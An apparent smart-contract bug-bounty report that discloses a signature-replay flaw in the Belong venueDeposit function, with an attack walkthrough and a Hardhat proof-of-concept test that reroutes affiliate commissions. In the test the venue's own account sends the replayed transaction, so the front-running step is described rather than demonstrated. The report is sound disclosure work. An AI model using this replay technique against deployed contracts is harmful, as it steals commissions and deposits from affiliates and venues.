# 57677 sc medium signature replay in venuedeposit enables affiliate referral code hijacking leading to unauthorized commission theft

**Submitted on Oct 28th 2025 at 05:10:11 UTC by @chupinexx for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57677
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>

## Impacts

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
* Affiliate steal all venues funds (via repeated commission theft)

## Description

### Brief / Intro

The signature scheme used to authorize `venueDeposit` transactions lacks any nonce or replay-prevention mechanism. Every signature issued for a venue deposit can be reused indefinitely. An affiliate who obtains a valid signature from a venue's first deposit can replay it and front-run any subsequent deposit the venue makes, causing commissions to be routed to the attacker instead of the intended affiliate.

### Vulnerability Details

The backend signature for venue deposits only covers four static fields:

```solidity
function checkVenueInfo(address signer, VenueInfo calldata venueInfo) external view {  
    require(  
        signer.isValidSignatureNow(  
            keccak256(abi.encodePacked(  
                venueInfo.venue,      // Static - venue address  
                venueInfo.referralCode, // Static - referral code  
                venueInfo.uri,        // Static - metadata URI  
                block.chainid         // Static - chain ID  
            )),  
            venueInfo.signature  
        ),  
        InvalidSignature()  
    );  
}
```

Critical missing elements:

* No nonce (no counter to track signature usage)
* No timestamp (no expiration)
* No amount binding (amount is not part of the signed payload)

The VenueInfo struct shows what is signed vs. what isn't:

```solidity
struct VenueInfo {  
    VenueRules rules;      // Not signed  
    address venue;         // Signed ✓  
    uint256 amount;        // Not signed  
    bytes32 referralCode;  // Signed ✓ (but replayable!)  
    string uri;            // Signed ✓  
    bytes signature;  
}
```

Although `referralCode` is included in the signed payload, without a nonce/timestamp it can be replayed indefinitely for future deposits.

## Step-by-Step Attack Execution

{% stepper %}
{% step %}

### First deposit with Affiliate A

* Venue makes an initial deposit using Affiliate A's referral code.
* Affiliate A receives commission and now possesses `signature_A` which proves (venue, referralCode\_A, uri, chainId).
* Because the signature lacks nonce/timestamp, `signature_A` remains valid forever.
  {% endstep %}

{% step %}

### Venue plans second deposit with Affiliate B

* Later, the venue initiates a second deposit intending to reward Affiliate B (different referral code).
* Backend issues `signature_B` for (venue, referralCode\_B, uri, chainId).
  {% endstep %}

{% step %}

### Affiliate A front-runs the second deposit

* Affiliate A observes the pending transaction and constructs a front-running transaction using:
  * same venue and uri
  * OLD referralCode (referralCode\_A)
  * NEW amount from the pending transaction
  * signature\_A (replayed)
* Affiliate A broadcasts with higher gas to execute first.
  {% endstep %}

{% step %}

### Signature validation passes

* The contract validates the signature using only (venue, referralCode, uri, chainId).
* Because those fields match what the backend signed for Affiliate A originally, the signature validates—even though it was already used.
* There is no check for signature reuse, nonce, or timestamp.
  {% endstep %}

{% step %}

### Affiliate A steals commission

* The contract calculates the affiliate fee from the NEW amount, but attributes it to Affiliate A (the replayed referralCode\_A).
* Affiliate A receives the commission for the second deposit instead of Affiliate B.
* If venue provided no new affiliate, the attack still steals the venue's affiliate fee (e.g., 10%).
  {% endstep %}
  {% endstepper %}

### Impact Details

* Direct and ongoing financial loss for affiliates: Any future affiliate commissions from a venue can be stolen by a previous affiliate who holds a valid signature. Over time this could amount to significant stolen commissions.
* Venue loss: If the venue deposits without a new referral code, previous affiliates can still replay signatures and steal a percentage (e.g., 10%) of the venue's deposits.

## References

* <https://github.com/belongnet/checkin-contracts/blob/6b78ead6186c49cfec2787522460ddd516579a6b/contracts/v2/platform/BelongCheckIn.sol#L382>
* <https://github.com/belongnet/checkin-contracts/blob/6b78ead6186c49cfec2787522460ddd516579a6b/contracts/v2/platform/BelongCheckIn.sol#L389-L394>

## Proof of Concept

Add this test to the existing test suite in `test/v2/platform/belong-check-in.test.ts`

```javascript
it('PoC: Affiliate A replays old signature to hijack Affiliate B commission', async () => {  
  const {  
    belongCheckIn,  
    escrow,  
    venueToken,  
    helper,  
    referral,  
    signer,  
    referralCode,  
    factory,  
    USDC,  
    ENA,  
    USDC_whale,  
  } = await loadFixture(fixture);  
  
  // ============================================  
  // STEP 1: Create second affiliate (Affiliate B)  
  // ============================================  
  console.log('\n=== STEP 1: Setup Two Affiliates ===');  
  const [, , , , , , , , , affiliateB] = await ethers.getSigners();  
    
  // Create referral code for Affiliate B  
  const referralCodeB = EthCrypto.hash.keccak256([  
    { type: 'address', value: affiliateB.address },  
    { type: 'address', value: factory.address },  
    { type: 'uint256', value: chainId },  
  ]);  
  await factory.connect(affiliateB).createReferralCode();  
    
  console.log(`Affiliate A address: ${referral.address}`);  
  console.log(`Affiliate B address: ${affiliateB.address}`);  
  console.log(`Affiliate A referral code: ${referralCode}`);  
  console.log(`Affiliate B referral code: ${referralCodeB}`);  
  
  // ============================================  
  // STEP 2: First deposit with Affiliate A  
  // ============================================  
  console.log('\n=== STEP 2: First Deposit with Affiliate A ===');  
  const uri = 'ipfs://venue-metadata';  
  const firstDepositAmount = await u(1000, USDC);  
  const venue = USDC_whale.address;  
    
  // Backend signs for Affiliate A  
  const messageA = ethers.utils.solidityKeccak256(  
    ['address', 'bytes32', 'string', 'uint256'],  
    [venue, referralCode, uri, chainId],  
  );  
  const signatureA = EthCrypto.sign(signer.privateKey, messageA);  
    
  console.log(' Backend signed for Affiliate A: (venue, referralCode_A, uri, chainId)');  
  console.log(' No nonce or timestamp - signature can be replayed!');  
  
  const venueInfoA: VenueInfoStruct = {  
    rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,  
    venue,  
    amount: firstDepositAmount,  
    referralCode,  
    uri,  
    signature: signatureA,  
  };  
  
  const affiliateAFee = await helper.calculateRate(fees.affiliatePercentage, firstDepositAmount);  
  const firstTotal = affiliateAFee.add(convenienceFeeAmount).add(firstDepositAmount);  
    
  await USDC.connect(USDC_whale).approve(belongCheckIn.address, firstTotal);  
    
  const affiliateABalanceBefore = await ENA.balanceOf(referral.address);  
    
  await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfoA);  
    
  const affiliateABalanceAfter = await ENA.balanceOf(referral.address);  
  const affiliateAGain = affiliateABalanceAfter.sub(affiliateABalanceBefore);  
    
  console.log(`First deposit: ${ethers.utils.formatUnits(firstDepositAmount, 6)} USDC`);  
  console.log(`Affiliate A received: ${ethers.utils.formatEther(affiliateAGain)} LONG`);  
  console.log('  Affiliate A stores signature_A for later replay');  
  
  // ============================================  
  // STEP 3: Venue plans second deposit with Affiliate B  
  // ============================================  
  console.log('\n=== STEP 3: Venue Plans Second Deposit with Affiliate B ===');  
  const secondDepositAmount = await u(2000, USDC);  
    
  // Backend signs for Affiliate B (different referral code)  
  const messageB = ethers.utils.solidityKeccak256(  
    ['address', 'bytes32', 'string', 'uint256'],  
    [venue, referralCodeB, uri, chainId],  
  );  
  const signatureB = EthCrypto.sign(signer.privateKey, messageB);  
    
  console.log(`Second deposit amount: ${ethers.utils.formatUnits(secondDepositAmount, 6)} USDC`);  
  console.log(' Backend signed for Affiliate B: (venue, referralCode_B, uri, chainId)');  
  console.log(' Venue intends to reward Affiliate B this time');  
  
  const venueInfoB: VenueInfoStruct = {  
    rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,  
    venue,  
    amount: secondDepositAmount,  
    referralCode: referralCodeB,  
    uri,  
    signature: signatureB,  
  };  
  
  const expectedAffiliateBFee = await helper.calculateRate(fees.affiliatePercentage, secondDepositAmount);  
  console.log(`Expected commission for Affiliate B: ${ethers.utils.formatUnits(expectedAffiliateBFee, 6)} USDC`);  
  
  // ============================================  
  // STEP 4: Affiliate A front-runs with replayed signature  
  // ============================================  
  console.log('\n=== STEP 4: Affiliate A Front-Runs with Replayed Signature ===');  
    
  // Affiliate A creates attack transaction using OLD signature but NEW amount  
  const attackVenueInfo: VenueInfoStruct = {  
    rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,  
    venue, // Same venue  
    amount: secondDepositAmount, // NEW amount (2000 USDC)  
    referralCode, // OLD referral code (Affiliate A)  
    uri, // Same URI  
    signature: signatureA, // REPLAYED old signature!  
  };  
  
  console.log('  Affiliate A replays old signature_A');  
  console.log(` With NEW amount: ${ethers.utils.formatUnits(secondDepositAmount, 6)} USDC`);  
  console.log(' Using OLD referralCode_A (not referralCode_B)');  
  
  const replayedAffiliateFee = await helper.calculateRate(fees.affiliatePercentage, secondDepositAmount);  
  const secondTotal = replayedAffiliateFee.add(convenienceFeeAmount).add(secondDepositAmount);  
    
  // Venue has approved enough for second deposit  
  await USDC.connect(USDC_whale).approve(belongCheckIn.address, secondTotal);  
  
  const affiliateABalanceBeforeReplay = await ENA.balanceOf(referral.address);  
  const affiliateBBalanceBefore = await ENA.balanceOf(affiliateB.address);  
    
  // ============================================  
  // STEP 5: Attack executes successfully  
  // ============================================  
  console.log('\n=== STEP 5: Attack Execution ===');  
    
  // Affiliate A's replayed transaction succeeds  
  const tx = await belongCheckIn.connect(USDC_whale).venueDeposit(attackVenueInfo);  
    
  console.log(' Transaction succeeded - replayed signature validated!');  
  console.log(' Signature only checked: (venue, referralCode_A, uri, chainId)');  
  console.log(' No nonce check - signature was already used but still valid');  
  console.log(' No timestamp check - signature never expires');  
  
  const affiliateABalanceAfterReplay = await ENA.balanceOf(referral.address);  
  const affiliateBBalanceAfter = await ENA.balanceOf(affiliateB.address);  
    
  const affiliateASecondGain = affiliateABalanceAfterReplay.sub(affiliateABalanceBeforeReplay);  
  const affiliateBGain = affiliateBBalanceAfter.sub(affiliateBBalanceBefore);  
  
  // ============================================  
  // STEP 6: Verify the theft  
  // ============================================  
  console.log('\n=== STEP 6: Impact Assessment ===');  
    
  console.log('\n--- Affiliate A (Attacker) ---');  
  console.log(`First deposit commission: ${ethers.utils.formatEther(affiliateAGain)} LONG`);  
  console.log(`Second deposit commission (stolen): ${ethers.utils.formatEther(affiliateASecondGain)} LONG`);  
  console.log(`Total LONG received: ${ethers.utils.formatEther(affiliateABalanceAfterReplay.sub(affiliateABalanceBefore))} LONG`);  
    
  console.log('\n--- Affiliate B (Victim) ---');  
  console.log(`Expected commission: ${ethers.utils.formatUnits(expectedAffiliateBFee, 6)} USDC worth of LONG`);  
  console.log(`Actual commission received: ${ethers.utils.formatEther(affiliateBGain)} LONG`);  
  console.log(`Loss: ${ethers.utils.formatUnits(expectedAffiliateBFee, 6)} USDC worth of LONG`);  
    
  
  // ============================================  
  // STEP 7: Assertions  
  // ============================================  
  console.log('\n=== STEP 7: Verification ===');  
    
  // Verify Affiliate A received the second commission  
  expect(affiliateASecondGain).to.be.gt(0);  
  console.log(' Affiliate A received commission from second deposit');  
    
  // Verify Affiliate B received nothing  
  expect(affiliateBGain).to.eq(0);  
  console.log(' Affiliate B received ZERO commission (stolen by Affiliate A)');  
    
  // Verify the replayed signature worked  
  await expect(tx).to.emit(belongCheckIn, 'VenuePaidDeposit')  
    .withArgs(venue, referralCode, attackVenueInfo.rules, secondDepositAmount);  
  console.log(' Event emitted with Affiliate A\'s referralCode (not Affiliate B\'s)');  
    
  // Verify venue credits were minted for second deposit  
  const venueCredits = await venueToken.balanceOf(venue, await helper.getVenueId(venue));  
  expect(venueCredits).to.eq(firstDepositAmount.add(secondDepositAmount));  
  console.log(' Venue credits correctly minted for both deposits');  
    
  console.log('\n=== EXPLOIT SUCCESSFUL ===');  
  console.log('Signature replay enabled Affiliate A to steal Affiliate B\'s commission');  
  console.log('Root cause: No nonce or timestamp in signature verification');  
  console.log('Impact: Any affiliate can hijack all future deposits from venues they\'ve worked with');  
});
```

Run the test:

```bash
npm install

# Run ONLY the specific PoC
npx hardhat test --grep "PoC: Affiliate A replays old signature to hijack Affiliate B commission"
```

The test demonstrates:

1. Setup two affiliates (A and B) with distinct referral codes
2. First deposit with Affiliate A (legitimate commission)
3. Venue intends to use Affiliate B for the second deposit
4. Affiliate A front-runs using a replayed signature from the first deposit
5. The replayed signature validates and Affiliate A receives the second commission
6. Affiliate B receives zero commission while Affiliate A steals it
